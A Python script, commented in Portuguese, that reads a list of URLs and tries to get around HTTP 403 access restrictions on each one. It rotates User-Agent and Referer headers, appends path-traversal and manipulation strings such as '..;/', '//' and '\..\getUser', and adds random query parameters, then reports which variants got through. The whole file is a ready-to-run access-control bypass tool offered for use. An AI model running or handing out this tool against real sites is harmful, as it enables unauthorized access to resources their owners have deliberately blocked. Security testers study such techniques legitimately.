import requests
from colorama import Fore, Style
import sys
import random
import string

def load_urls(file_path):
    """Carrega as URLs a partir de um arquivo .txt"""
    try:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
        return urls
    except FileNotFoundError:
        print("Arquivo não encontrado. Verifique o caminho.")
        sys.exit(1)

def generate_random_string(length=10):
    """Gera uma string aleatória de um determinado comprimento"""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def try_bypass(url):
    """Tenta contornar o erro 403 de diferentes maneiras"""
    # Definindo vários cabeçalhos para tentativas de bypass
    headers_list = [
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Referer": "https://www.example.com"
        },
        {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
            "Referer": "https://www.anotherexample.com"
        },
        {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        }
    ]
    
    # Strings a serem usadas para manipulação de URLs
    manipulation_strings = [
        "/", "/*", "/./", "//", "??", "?", "..;/", ".json", ".php", "&accountsdetail", "\\..\\getUser"
    ]

    # Tentativa de acessar a URL original
    try:
        response = requests.get(url, headers=headers_list[0], timeout=5)
        if response.status_code == 403:
            print(Fore.YELLOW + f"[403] {url} - Tentando Bypass...")

            # Tentativas de Bypass com cabeçalhos variados
            for headers in headers_list:
                bypass_response = requests.get(url, headers=headers, timeout=5)
                if bypass_response.status_code != 403:
                    print(Fore.GREEN + f"[Sucesso] {url} - Bypass realizado com cabeçalho: {headers}.")
                    return
            
            # Tentativa de Bypass através de manipulação de URL
            for manipulation in manipulation_strings:
                modified_url = f"{url}{manipulation}"
                bypass_response = requests.get(modified_url, headers=headers_list[0], timeout=5)
                if bypass_response.status_code != 403:
                    print(Fore.GREEN + f"[Sucesso] {modified_url} - Bypass realizado com string de manipulação.")
                    return

            # Adicionando parâmetros aleatórios como tentativa de Bypass
            for _ in range(5):  # Tenta 5 variações de URL
                random_string = generate_random_string()
                modified_url = f"{url}?id={random_string}"  # Adiciona um parâmetro aleatório
                bypass_response = requests.get(modified_url, headers=headers_list[0], timeout=5)
                if bypass_response.status_code != 403:
                    print(Fore.GREEN + f"[Sucesso] {modified_url} - Bypass realizado com parâmetro aleatório.")
                    return

            print(Fore.RED + f"[Falha] {url} - Bypass não realizado.")
        else:
            print(Fore.GREEN + f"[Sucesso] {url} - Acesso permitido (código {response.status_code}).")

    except requests.RequestException as e:
        print(Fore.RED + f"[Erro] {url} - Falha ao conectar ({e}).")

if __name__ == "__main__":
    # Solicita o caminho do arquivo com as URLs
    file_path = input("URLs File: ")
    
    # Carrega as URLs do arquivo
    urls = load_urls(file_path)
    print(f"\nTestando {len(urls)} URLs para contornar o erro 403...\n")
    
    # Testa cada URL individualmente
    for url in urls:
        try_bypass(url)

    print(Style.RESET_ALL + "\nTeste concluído.")
